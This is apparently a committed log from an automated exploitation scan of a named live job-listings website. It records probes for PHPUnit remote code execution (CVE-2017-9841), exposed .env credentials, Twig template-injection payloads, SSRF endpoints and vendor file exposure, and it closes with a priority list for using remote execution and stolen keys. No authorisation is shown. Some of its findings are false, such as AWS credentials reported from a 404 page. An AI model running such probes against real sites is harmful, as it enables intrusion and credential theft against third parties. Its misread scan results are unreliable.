@@ -1,0 +1,147 @@
+==============================================
+  COMPREHENSIVE COMPOSER EXPLOITATION
+  Target: https://jobs.dnv.com
+  Wed Feb 11 13:10:18 +03 2026
+==============================================
+
+[0;31m[1] PHPUNIT RCE TESTING (CVE-2017-9841)[0m
+==============================================
+
+[1;33m[TEST][0m PHPUnit: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+URL: https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+HTTP: 404 | Size: 16 bytes
+
+[1;33m[TEST][0m PHPUnit: /vendor/phpunit/phpunit/src/Util/PHP/Template/TestCaseMethod.tpl
+URL: https://jobs.dnv.com/vendor/phpunit/phpunit/src/Util/PHP/Template/TestCaseMethod.tpl
+HTTP: 404 | Size: 93383 bytes
+
+[1;33m[2] ALGOLIA API KEY TESTING[0m
+==============================================
+Package: algolia/algoliasearch-client-php: 2.8.0
+
+[1;33m[3] AWS SDK CREDENTIAL TESTING[0m
+==============================================
+Package: aws/aws-sdk-php: 3.278.3
+
+[1;33m[TEST][0m Checking .env file
+URL: https://jobs.dnv.com/.env
+HTTP: 404 | Size: 93206 bytes
+[0;31m🔥 AWS CREDENTIALS IN .ENV![0m
+<link rel="shortcut icon" href="https://33-cdn-image-handler.s3.eu-west-2.amazonaws.com/production/dnvvcare2301/application/files/1616/8778/6099/favicon.ico" integrity="sha256-uzJHqpAzCC5cQg+ze6lxLwcSbwTJrbpygIGRTxXcDv0=%" crossorigin="anonymous" type="image/x-icon"/>
+<link rel="icon" href="https://33-cdn-image-handler.s3.eu-west-2.amazonaws.com/production/dnvvcare2301/application/files/1616/8778/6099/favicon.ico" integrity="sha256-uzJHqpAzCC5cQg+ze6lxLwcSbwTJrbpygIGRTxXcDv0=%" crossorigin="anonymous" type="image/x-icon"/>
+
+[1;33m[4] PARSEDOWN XSS TESTING[0m
+==============================================
+Package: erusev/parsedown: 1.7.4
+
+[1;33m[5] GUZZLE SSRF TESTING[0m
+==============================================
+Package: guzzlehttp/guzzle: 6.5.8
+CVEs: CVE-2022-31042, CVE-2022-31043, CVE-2022-31090, CVE-2022-31091
+
+[1;33m[TEST][0m RSS Feed endpoint
+URL: https://jobs.dnv.com/tools/required/blocks/rss/get_feed
+HTTP: 404 | Size: 93296 bytes
+
+[1;33m[6] TWIG SSTI TESTING[0m
+==============================================
+Package: twig/twig: v2.16.0
+Testing payload: {{7*7}}
+Testing payload: {{7*'7'}}
+Testing payload: {{_self}}
+
+[1;33m[7] FAKER PACKAGE EXPOSURE[0m
+==============================================
+Package: fzaninotto/faker: v1.9.2 (ABANDONED)
+
+[1;33m[TEST][0m Faker package directory
+URL: https://jobs.dnv.com/vendor/fzaninotto/faker/
+HTTP: 404 | Size: 93263 bytes
+
+[1;33m[TEST][0m Faker autoload.php
+URL: https://jobs.dnv.com/vendor/fzaninotto/faker/src/autoload.php
+HTTP: 200 | Size: 0 bytes
+[0;31m🔥 ACCESSIBLE![0m
+
+[1;33m[8] SYMFONY COMPONENT TESTING[0m
+==============================================
+Package: symfony/* v3.4.47 (EOL)
+Testing cache poisoning...
+
+[1;33m[9] CUSTOM PACKAGE TESTING[0m
+==============================================
+Package: thirtythree/c5-helpers: v3.2.3
+Source: git@gitlab.thirtythreebuild.co.uk:thirtythree/c5-helpers.git
+
+[1;33m[TEST][0m Custom package directory
+URL: https://jobs.dnv.com/vendor/thirtythree/c5-helpers/
+HTTP: 404 | Size: 93281 bytes
+
+[1;33m[TEST][0m Custom package source
+URL: https://jobs.dnv.com/vendor/thirtythree/c5-helpers/src/
+HTTP: 404 | Size: 93293 bytes
+[0;31m⚠️ Custom package source may be exposed![0m
+This could contain proprietary code and additional vulnerabilities
+
+[1;33m[10] ADDITIONAL VENDOR FILE EXPOSURE[0m
+==============================================
+
+[1;33m[TEST][0m Vendor: /vendor/
+URL: https://jobs.dnv.com/vendor/
+HTTP: 404 | Size: 93212 bytes
+
+[1;33m[TEST][0m Vendor: /vendor/autoload.php
+URL: https://jobs.dnv.com/vendor/autoload.php
+HTTP: 200 | Size: 0 bytes
+[0;31m🔥 ACCESSIBLE![0m
+
+[1;33m[TEST][0m Vendor: /vendor/composer/
+URL: https://jobs.dnv.com/vendor/composer/
+HTTP: 404 | Size: 93239 bytes
+
+[1;33m[TEST][0m Vendor: /vendor/composer/autoload_real.php
+URL: https://jobs.dnv.com/vendor/composer/autoload_real.php
+HTTP: 200 | Size: 0 bytes
+[0;31m🔥 ACCESSIBLE![0m
+
+[1;33m[TEST][0m Vendor: /vendor/composer/ClassLoader.php
+URL: https://jobs.dnv.com/vendor/composer/ClassLoader.php
+HTTP: 200 | Size: 0 bytes
+[0;31m🔥 ACCESSIBLE![0m
+
+[1;33m[TEST][0m Vendor: /vendor/composer/installed.json
+URL: https://jobs.dnv.com/vendor/composer/installed.json
+HTTP: 200 | Size: 123592 bytes
+[0;31m🔥 ACCESSIBLE![0m
+
+[1;33m[TEST][0m Vendor: /vendor/composer/LICENSE
+URL: https://jobs.dnv.com/vendor/composer/LICENSE
+HTTP: 200 | Size: 1070 bytes
+[0;31m🔥 ACCESSIBLE![0m
+
+[1;33m[TEST][0m Vendor: /vendor/bin/
+URL: https://jobs.dnv.com/vendor/bin/
+HTTP: 404 | Size: 93224 bytes
+
+==============================================
+[0;32mEXPLOITATION SUMMARY[0m
+==============================================
+
+All results saved to: ./composer_exploit_results/
+
+CRITICAL FILES TO CHECK:
+  - ./composer_exploit_results/rce_*.txt (PHPUnit RCE attempts)
+  - ./composer_exploit_results/algolia_*.txt (API keys)
+  - ./composer_exploit_results/response.tmp (latest response)
+
+HIGH PRIORITY TESTS:
+  1. PHPUnit RCE - CHECK IMMEDIATELY
+  2. Algolia API Keys - Check JavaScript
+  3. AWS Credentials - Check .env
+  4. Database Config - Check via RCE
+
+[0;32mReport generated: ./composer_exploit_results/REPORT.md[0m
+
+==============================================
+  EXPLOITATION COMPLETE
+==============================================
